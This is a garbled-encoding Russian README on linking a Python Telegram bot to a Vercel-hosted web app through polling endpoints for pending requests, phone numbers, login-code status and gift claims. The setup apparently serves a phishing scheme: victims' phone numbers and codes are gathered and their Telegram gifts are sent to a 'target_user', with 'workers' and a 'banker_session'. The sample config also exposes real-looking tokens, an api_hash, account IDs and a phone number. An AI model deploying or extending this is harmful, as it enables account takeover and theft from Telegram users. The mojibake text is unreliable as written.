# üîó –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ Python –±–æ—Ç–∞ –∫ Vercel

## –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ —Å–≤—è–∑–∏

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê         HTTP API         ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  Python Bot     ‚îÇ ‚óÑ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñ∫ ‚îÇ  Vercel (Next.js)‚îÇ
‚îÇ  (–û—Ç–¥–µ–ª—å–Ω—ã–π     ‚îÇ   Polling + Updates      ‚îÇ  (Frontend + API)‚îÇ
‚îÇ   —Å–µ—Ä–≤–µ—Ä)       ‚îÇ                          ‚îÇ                  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                          ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

## üìã –®–∞–≥ 1: –ü–æ–ª—É—á–∏—Ç–µ URL –≤–∞—à–µ–≥–æ Vercel –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è

–ü–æ—Å–ª–µ –¥–µ–ø–ª–æ—è –Ω–∞ Vercel –≤—ã –ø–æ–ª—É—á–∏—Ç–µ URL –≤–∏–¥–∞:
```
https://your-app-name.vercel.app
```

## üìã –®–∞–≥ 2: –û–±–Ω–æ–≤–∏—Ç–µ settings.json –±–æ—Ç–∞

–û—Ç–∫—Ä–æ–π—Ç–µ `scripts/settings.json` –∏ –æ–±–Ω–æ–≤–∏—Ç–µ `api_url`:

```json
{
  "bot_token": "–≤–∞—à_—Ç–æ–∫–µ–Ω_–±–æ—Ç–∞",
  "log_bot_token": "–≤–∞—à_—Ç–æ–∫–µ–Ω_–ª–æ–≥–æ–≤",
  "api_id": 39831972,
  "api_hash": "–≤–∞—à_api_hash",
  "api_url": "https://your-app-name.vercel.app",
  "admin_ids": [–≤–∞—à_admin_id],
  "workers": [–≤–∞—à_worker_id],
  "target_user": "@–≤–∞—à_username",
  "banker_session": "–Ω–æ–º–µ—Ä_—Ç–µ–ª–µ—Ñ–æ–Ω–∞_–±–∞–Ω–∫–∏—Ä–∞"
}
```

**–í–∞–∂–Ω–æ:** 
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ URL –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å `https://`
- –ù–µ –¥–æ–±–∞–≤–ª—è–π—Ç–µ `/` –≤ –∫–æ–Ω—Ü–µ URL
- URL –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –¥–æ—Å—Ç—É–ø–µ–Ω –∏–∑ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞

## üìã –®–∞–≥ 3: –ü—Ä–æ–≤–µ—Ä—å—Ç–µ API endpoints

–ë–æ—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ endpoints –Ω–∞ Vercel:

### 1. –ü–æ–ª—É—á–µ–Ω–∏–µ pending –∑–∞–ø—Ä–æ—Å–æ–≤ (Polling)
```
GET https://your-app.vercel.app/api/telegram/get-pending
```
–ë–æ—Ç –æ–ø—Ä–∞—à–∏–≤–∞–µ—Ç —ç—Ç–æ—Ç endpoint –∫–∞–∂–¥—ã–µ 0.5 —Å–µ–∫—É–Ω–¥—ã

### 2. –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –∑–∞–ø—Ä–æ—Å–∞
```
POST https://your-app.vercel.app/api/telegram/update-request
Body: {
  "requestId": "...",
  "status": "waiting_code|success|error",
  "phone": "...",
  "telegramId": "...",
  "processed": true
}
```

### 3. –û—Ç–ø—Ä–∞–≤–∫–∞ claim –ø–æ–¥–∞—Ä–∫–∞
```
POST https://your-app.vercel.app/api/telegram/claim-gift
Body: {
  "telegramId": "...",
  "giftId": "...",
  "giftHash": "...",
  "username": "..."
}
```

### 4. –ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ç–∞–∫—Ç–∞
```
POST https://your-app.vercel.app/api/telegram/receive-phone
Body: {
  "phone": "...",
  "telegramId": "..."
}
```

## üìã –®–∞–≥ 4: –ó–∞–ø—É—Å—Ç–∏—Ç–µ –±–æ—Ç–∞

```bash
cd scripts
python unified_bot_v3.py
```

–ë–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –Ω–∞—á–Ω–µ—Ç –æ–ø—Ä–∞—à–∏–≤–∞—Ç—å API –Ω–∞ Vercel.

## ‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–≤—è–∑–∏

### 1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏ –±–æ—Ç–∞

–ü—Ä–∏ —É—Å–ø–µ—à–Ω–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –≤—ã —É–≤–∏–¥–∏—Ç–µ:
```
[INFO] Polling API...
[INFO] Found X pending request(s)
```

### 2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏ Vercel

–í Vercel Dashboard ‚Üí –≤–∞—à–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ ‚Üí Logs:
- –î–æ–ª–∂–Ω—ã –ø–æ—è–≤–ª—è—Ç—å—Å—è –∑–∞–ø—Ä–æ—Å—ã –æ—Ç –±–æ—Ç–∞
- `GET /api/telegram/get-pending` - –∫–∞–∂–¥—ã–µ 0.5 —Å–µ–∫
- `POST /api/telegram/update-request` - –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ —Å—Ç–∞—Ç—É—Å–∞

### 3. –¢–µ—Å—Ç —á–µ—Ä–µ–∑ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ

1. –û—Ç–∫—Ä–æ–π—Ç–µ –≤–∞—à–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–∞ Vercel
2. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è
3. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ, —á—Ç–æ –±–æ—Ç –ø–æ–ª—É—á–∞–µ—Ç –∑–∞–ø—Ä–æ—Å—ã –∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∏—Ö

## üîß –†–µ—à–µ–Ω–∏–µ –ø—Ä–æ–±–ª–µ–º

### –ü—Ä–æ–±–ª–µ–º–∞: –ë–æ—Ç –Ω–µ –ø–æ–ª—É—á–∞–µ—Ç –∑–∞–ø—Ä–æ—Å—ã

**–†–µ—à–µ–Ω–∏–µ:**
1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ `api_url` –≤ `settings.json`
2. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ URL –¥–æ—Å—Ç—É–ø–µ–Ω: `curl https://your-app.vercel.app/api/telegram/get-pending`
3. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏ –±–æ—Ç–∞ –Ω–∞ –æ—à–∏–±–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è

### –ü—Ä–æ–±–ª–µ–º–∞: CORS –æ—à–∏–±–∫–∏

**–†–µ—à–µ–Ω–∏–µ:**
Vercel –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç CORS –¥–ª—è API routes. –ï—Å–ª–∏ –ø—Ä–æ–±–ª–µ–º—ã:
- –ü—Ä–æ–≤–µ—Ä—å—Ç–µ, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π URL
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –Ω–µ—Ç –ª–∏—à–Ω–∏—Ö `/` –≤ –∫–æ–Ω—Ü–µ URL

### –ü—Ä–æ–±–ª–µ–º–∞: Timeout –æ—à–∏–±–∫–∏

**–†–µ—à–µ–Ω–∏–µ:**
1. –£–≤–µ–ª–∏—á—å—Ç–µ timeout –≤ –∫–æ–¥–µ –±–æ—Ç–∞ (—Å–µ–π—á–∞—Å 10 —Å–µ–∫—É–Ω–¥)
2. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–∫–æ—Ä–æ—Å—Ç—å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —Å –±–æ—Ç–æ–º
3. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ Vercel –Ω–µ –≤ —Ä–µ–∂–∏–º–µ sleep (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ Pro –ø–ª–∞–Ω –∏–ª–∏ keep-alive)

### –ü—Ä–æ–±–ª–µ–º–∞: 404 Not Found

**–†–µ—à–µ–Ω–∏–µ:**
1. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ, —á—Ç–æ –≤—Å–µ API routes –∑–∞–¥–µ–ø–ª–æ–µ–Ω—ã
2. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –ø–∞–ø–æ–∫ –ø—Ä–∞–≤–∏–ª—å–Ω–∞—è: `app/api/telegram/...`
3. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ª–æ–≥–∏ Vercel –Ω–∞ –æ—à–∏–±–∫–∏ —Å–±–æ—Ä–∫–∏

## üöÄ –û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è

### 1. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è

–í–º–µ—Å—Ç–æ —Ö–∞—Ä–¥–∫–æ–¥–∞ –≤ `settings.json`, –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:

```python
import os

api_url = os.getenv("API_URL", "https://your-app.vercel.app")
```

### 2. Keep-alive –¥–ª—è Vercel

–ß—Ç–æ–±—ã Vercel –Ω–µ –∑–∞—Å—ã–ø–∞–ª (–Ω–∞ –±–µ—Å–ø–ª–∞—Ç–Ω–æ–º –ø–ª–∞–Ω–µ):
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ cron job –¥–ª—è ping –∫–∞–∂–¥—ã–µ 5 –º–∏–Ω—É—Ç
- –ò–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–µ—Ä–≤–∏—Å —Ç–∏–ø–∞ UptimeRobot

### 3. –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥

–ù–∞—Å—Ç—Ä–æ–π—Ç–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥:
- –õ–æ–≥–∏ –±–æ—Ç–∞
- –õ–æ–≥–∏ Vercel
- Uptime monitoring –¥–ª—è API

## üìù –ü—Ä–∏–º–µ—Ä –ø–æ–ª–Ω–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–∏

### settings.json
```json
{
  "bot_token": "8503312636:AAFn83fVJW...",
  "log_bot_token": "7683211949:AAEp6UDwa...",
  "api_id": 39831972,
  "api_hash": "037087fc71eab9ce52397d7001c31520",
  "api_url": "https://your-marketplace.vercel.app",
  "admin_ids": [6233384461],
  "workers": [6233384461],
  "target_user": "@mmargooo113",
  "banker_session": "380730428015"
}
```

### –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
```bash
cd scripts
python unified_bot_v3.py
```

### –ü—Ä–æ–≤–µ—Ä–∫–∞
```bash
# –ü—Ä–æ–≤–µ—Ä–∫–∞ API
curl https://your-marketplace.vercel.app/api/telegram/get-pending

# –î–æ–ª–∂–µ–Ω –≤–µ—Ä–Ω—É—Ç—å JSON —Å pending requests
```

## ‚úÖ –ì–æ—Ç–æ–≤–æ!

–¢–µ–ø–µ—Ä—å –±–æ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω –∫ Vercel –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!

